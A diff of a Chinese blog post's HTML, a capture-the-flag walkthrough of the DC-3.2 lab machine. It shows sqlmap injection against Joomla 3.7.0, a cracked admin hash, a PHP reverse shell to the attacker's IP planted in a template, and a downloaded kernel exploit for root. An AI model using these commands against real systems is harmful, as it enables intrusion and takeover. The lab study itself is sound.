@@ -258,123 +258,264 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p> 本次学习的是DC-3.2靶机，涉及到端口扫描，目录扫描，sql注入，john破解hash，内核漏洞提权</p>
+        <p>本次学习的是DC-3.2靶机，涉及到端口扫描，目录扫描，sql注入，john破解hash，内核漏洞提权</p>
 <span id="more"></span>
 <p>该靶机打开的 时候会遇到下面的问题：</p>
-<p><img src="1.png" alt="图片"></p>
+<figure>
+<img src="1.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>我们只需要在cd/dvd里的高级把IDE改成0:0即可</p>
-<p><img src="2.png" alt="图片"></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描主机ip：</p>
+<figure>
+<img src="2.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h2 id="信息收集">信息收集</h2>
+<p>扫描主机ip：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="3.png" alt="图片"></p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描开放端口：</p>
+<figure>
+<img src="3.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h3 id="端口扫描">端口扫描</h3>
+<p>扫描开放端口：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.130.151</span><br></pre></td></tr></table></figure>
-<p><img src="4.png" alt="图片"></p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>与以往的不一样，这里只开放了80端口，那就进行目录扫描：</p>
+<figure>
+<img src="4.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h3 id="目录扫描">目录扫描</h3>
+<p>与以往的不一样，这里只开放了80端口，那就进行目录扫描：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.151 -i,200</span><br></pre></td></tr></table></figure>
-<p><img src="5.png" alt="图片"></p>
+<figure>
+<img src="5.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>扫描到robots文件和administrator目录，先看下robots文件记录内容：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.151/robots.txt.dist</span><br></pre></td></tr></table></figure>
-<p><img src="7.png" alt="图片"></p>
+<figure>
+<img src="7.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>然后再查看下administrator：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.151/administrator/</span><br></pre></td></tr></table></figure>
-<p><img src="8.png" alt="图片"></p>
+<figure>
+<img src="8.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>原来是后台的登录页面，没有账号密码，那就先用sqlmap跑一下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.130.151/administrator/index.php --data=<span class="string">&quot;username=1&amp;passwd=1&quot;</span> --batch</span><br></pre></td></tr></table></figure>
-<p><img src="9.png" alt="图片"></p>
+<figure>
+<img src="9.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>不存在注入点，不过我们发现该cms是<strong>joomla</strong>，我们可以用joomscan来扫描使用的版本，然后查看是否有历史漏洞：</p>
-<p><img src="10.png" alt="图片"></p>
+<figure>
+<img src="10.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br><span class="line">joomscan -u 192.168.130.151</span><br></pre></td></tr></table></figure>
-<p><img src="11.png" alt="图片"></p>
+<figure>
+<img src="11.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>版本是3.7.0，使用自带的漏洞库查找：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure>
-<p><img src="12.png" alt="图片"></p>
+<figure>
+<img src="12.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>我们使用第一个脚本进行sql注入，需要先把该脚本下载到当前目录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 42033.txt</span><br></pre></td></tr></table></figure>
-<p><img src="13.png" alt="图片"></p>
+<figure>
+<img src="13.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>查看其内容：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 42033.txt</span><br></pre></td></tr></table></figure>
-<p><img src="14.png" alt="图片"></p>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>直接给出了sqlmap梭哈的命令：</p>
+<figure>
+<img src="14.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h2 id="sql注入">SQL注入</h2>
+<p>直接给出了sqlmap梭哈的命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.130.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="15.png" alt="图片"></p>
+<figure>
+<img src="15.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>扫描出数据库<strong>joomladb</strong>数据库，接着查找相关的表：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.130.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch -D joomladb -tables</span><br></pre></td></tr></table></figure>
-<p><img src="16.png" alt="图片"></p>
+<figure>
+<img src="16.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>查到users表，我想继续查找字段名，按照一般性的语句查找列，但是死活跑不出来，留一个大大的问号？？？</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.130.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --batch -p list[fullordering] -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> --columns</span><br></pre></td></tr></table></figure>
-<p><img src="17.png" alt="图片"></p>
+<figure>
+<img src="17.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>但是下面的语句却能跑出来正确的列，不知道为什么。。。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.130.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 -p list[fullordering] -D <span class="string">&quot;joomladb&quot;</span> --tables -T <span class="string">&quot;#__users&quot;</span> --columns</span><br></pre></td></tr></table></figure>
-<p><img src="18.png" alt="图片"></p>
-<p><img src="19.png" alt="图片"></p>
+<figure>
+<img src="18.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<figure>
+<img src="19.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>那就把username和password字段的数据导出来：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.130.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 -p list[fullordering] -D <span class="string">&quot;joomladb&quot;</span> --tables -T <span class="string">&quot;#__users&quot;</span> -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
-<p><img src="20.png" alt="图片"></p>
-<p>查到amdin的hash密码：<strong>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</strong>，我们用john工具尝试能否解出来：</p>
-<p><img src="21.png" alt="图片"></p>
+<figure>
+<img src="20.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<p>查到amdin的hash密码：<strong>$2y<span
+class="math inline">10</span>DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</strong>，我们用john工具尝试能否解出来：</p>
+<figure>
+<img src="21.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>密码：<strong>snoopy</strong></p>
 <p>登录后台发现我们可以编写模板页面：</p>
-<p><img src="22.png" alt="图片"></p>
-<p><img src="23.png" alt="图片"></p>
+<figure>
+<img src="22.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<figure>
+<img src="23.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>我们往里面写入phpinfo看是否有效：</p>
-<p><img src="24.png" alt="图片"></p>
+<figure>
+<img src="24.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>这里如何确定该文件的目录结构呢？要么去网上找该cms的框架结构，或者一点点尝试：先试试<strong>/administrator/templates/</strong>，虽然有内容，但这些页面跟我们要找的不一致，那就把administrator去掉，尝试<strong>/templates/beez3/</strong>，虽然是空白页面，但并没有报错，说明该目录下存在文件：</p>
-<p><img src="25_1.png" alt="图片"></p>
-<p><img src="25_2.png" alt="图片"></p>
+<figure>
+<img src="25_1.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<figure>
+<img src="25_2.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>尝试jsstrings.php写入的phpinfo是否有效：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.151/templates/beez3/jsstrings.php</span><br></pre></td></tr></table></figure>
-<p><img src="25.png" alt="图片"></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>既然有效，那我们往里面加入反弹shell的命令：</p>
+<figure>
+<img src="25.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h2 id="getshell">getshell</h2>
+<p>既然有效，那我们往里面加入反弹shell的命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.130.128/8888 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="26.png" alt="图片"></p>
+<figure>
+<img src="26.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>开启监听，然后访问jsstring.php页面：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888 </span><br></pre></td></tr></table></figure>
-<p><img src="27.png" alt="图片"></p>
+<figure>
+<img src="27.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>成功<strong>getshell</strong>（这里也可以用蚁剑getshell）</p>
-<h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>下面没有sudo提权也没有suid提权，比较难搞，查看其内核版本和发行版本（<strong>内核版本</strong>是 Linux 的核心引擎，<strong>发行版本</strong>是包含引擎的完整汽车）：</p>
+<h3 id="内核漏洞提权">内核漏洞提权</h3>
+<p>下面没有sudo提权也没有suid提权，比较难搞，查看其内核版本和发行版本（<strong>内核版本</strong>是
+Linux 的核心引擎，<strong>发行版本</strong>是包含引擎的完整汽车）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a  //查看内核版本号</span><br><span class="line">lsb_release -a  //发行版本号</span><br></pre></td></tr></table></figure>
-<p><img src="28.png" alt="图片"></p>
-<p><img src="29.png" alt="图片"></p>
+<figure>
+<img src="28.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<figure>
+<img src="29.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>继续使用漏洞库查找有没有与之相关的历史漏洞：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
-<p><img src="30.png" alt="图片"></p>
-<p>我们使用第三个：Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation         | linux/local/39772.txt，先下载下来</p>
+<figure>
+<img src="30.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<p>我们使用第三个：Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’
+bpf(BPF_PROG_LOAD) Privilege Escalation |
+linux/local/39772.txt，先下载下来</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 39772.txt</span><br></pre></td></tr></table></figure>
 <p>查看其内容</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 39772.txt</span><br></pre></td></tr></table></figure>
-<p><img src="31.png" alt="图片"></p>
-<p>找到脚本的下载地址：<a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a>，我们需要把该脚本放到webshell中执行就能提权</p>
+<figure>
+<img src="31.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<p>找到脚本的下载地址：<a
+target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a>，我们需要把该脚本放到webshell中执行就能提权</p>
 <p>以为随便一个目录就可以呢，结果是必须在<code>/var/www/html/templates/beez3</code>目录下</p>
 <p>有两种方式把该脚本上传到靶机上</p>
 <p><strong>一</strong>.kali主机上wget下载到指定的目录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O <span class="string">&quot;/home/zh1yu/39772.zip&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="32.png" alt="图片"></p>
-<p>然后在<strong>该目录下</strong>启动简易 HTTP 服务器的Python 2 命令，主要用于本地开发或文件共享</p>
+<figure>
+<img src="32.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<p>然后在<strong>该目录下</strong>启动简易 HTTP 服务器的Python 2
+命令，主要用于本地开发或文件共享</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>
-<p><img src="33.png" alt="图片"></p>
+<figure>
+<img src="33.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>然后在webshell中下载（<strong>这里下载的根目录是http服务开启的目录</strong>：<code>/home/zh1yu/</code>）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.130.128:9999/dc8.sh -O /tmp/39772.zip</span><br></pre></td></tr></table></figure>
-<p><img src="34.png" alt="图片"></p>
+<figure>
+<img src="34.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>当然上面那种做法比较麻烦，完全可以在webshell中下载脚本，在wget能使用的前提下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O /tmp/39772.zip</span><br></pre></td></tr></table></figure>
 <p>上面的下载地址是放在了<code>/tmp</code>目录下，这是错误的，必须在<code>/var/www/html/templates/beez3</code>目录下才可以正常执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/templates/beez3</span><br></pre></td></tr></table></figure>
-<p><img src="37.png" alt="图片"></p>
+<figure>
+<img src="37.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>然后解压，找到sh脚本文件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip</span><br><span class="line"><span class="built_in">cd</span> 39772</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>
-<p><img src="38.png" alt="图片"></p>
+<figure>
+<img src="38.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>执行脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
-<p><img src="39.png" alt="图片"></p>
+<figure>
+<img src="39.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>提权成功，查找flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cat</span> the-flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="40.png" alt="图片"></p>
+<figure>
+<img src="40.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>学习一下compile.sh和./compile.sh的区别：</p>
-<p><strong>compile.sh</strong>：Shell 会按照 <code>PATH</code> 环境变量定义的目录顺序<strong>搜索可执行文件</strong>。例如，若 <code>PATH=/usr/local/bin:/usr/bin:/bin</code>，Shell 会依次在这些目录中查找 <code>compile.sh</code>，<strong>如果文件在当前目录但不在 <code>PATH</code> 中</strong>，Shell 会报错，<strong>为什么默认不搜索当前目录？</strong>，防止恶意程序劫持命令（例如当前目录下的恶意 <code>ls</code> 覆盖系统命令）。</p>
-<p><strong>./compile.sh</strong>：<code>./</code> 表示<strong>显式指定当前目录</strong>，Shell 会直接执行当前目录下的 <code>doubleput</code> 文件，<strong>完全绕过 <code>PATH</code> 搜索</strong>，无论 <code>PATH</code> 如何设置，只要当前目录有 <code>doubleput</code> 且用户有执行权限，就能运行。</p>
+<p><strong>compile.sh</strong>：Shell 会按照 <code>PATH</code>
+环境变量定义的目录顺序<strong>搜索可执行文件</strong>。例如，若
+<code>PATH=/usr/local/bin:/usr/bin:/bin</code>，Shell
+会依次在这些目录中查找
+<code>compile.sh</code>，<strong>如果文件在当前目录但不在
+<code>PATH</code> 中</strong>，Shell
+会报错，<strong>为什么默认不搜索当前目录？</strong>，防止恶意程序劫持命令（例如当前目录下的恶意
+<code>ls</code> 覆盖系统命令）。</p>
+<p><strong>./compile.sh</strong>：<code>./</code>
+表示<strong>显式指定当前目录</strong>，Shell 会直接执行当前目录下的
+<code>doubleput</code> 文件，<strong>完全绕过 <code>PATH</code>
+搜索</strong>，无论 <code>PATH</code> 如何设置，只要当前目录有
+<code>doubleput</code> 且用户有执行权限，就能运行。</p>
 <p>真滴是越学发现不懂的越多😭😭😭</p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://gtl-ju.github.io/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">https://gtl-ju.github.io/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</a></p>
+<p>参考文章：<a
+target="_blank" rel="noopener" href="https://gtl-ju.github.io/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">https://gtl-ju.github.io/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</a></p>
 <ul>
 <li><code>光荣在于平淡，艰辛在于漫长</code></li>
 </ul>
@@ -501,7 +642,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.</span> <span class="nav-text">内核漏洞提权</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.</span> <span class="nav-text">内核漏洞提权</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
